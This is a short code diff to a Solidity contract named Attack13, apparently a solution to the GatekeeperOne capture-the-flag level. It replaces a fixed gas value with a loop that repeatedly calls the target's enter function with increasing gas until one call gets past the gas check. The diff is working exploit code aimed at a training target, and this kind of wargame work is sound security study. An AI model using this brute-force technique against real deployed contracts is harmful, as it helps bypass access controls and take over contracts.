@@ -12,8 +12,16 @@ contract Attack13 {
         target = GatekeeperOne(_targetAddress);
     }
 
-    function attack(bytes8 _gateKey, uint _gasAmount) external {
-        target.enter{gas: 8191 + _gasAmount}(_gateKey);
+    function attack(bytes8 _gateKey) external {
+        for (uint256 i = 0; i < 24000; i++) {
+            (bool result, ) = address(target).call{gas: 8191 + i}(
+                abi.encodeWithSignature(("enter(bytes8)"), _gateKey)
+            );
+
+            if (result) {
+                break;
+            }
+        }
     }
 }
 
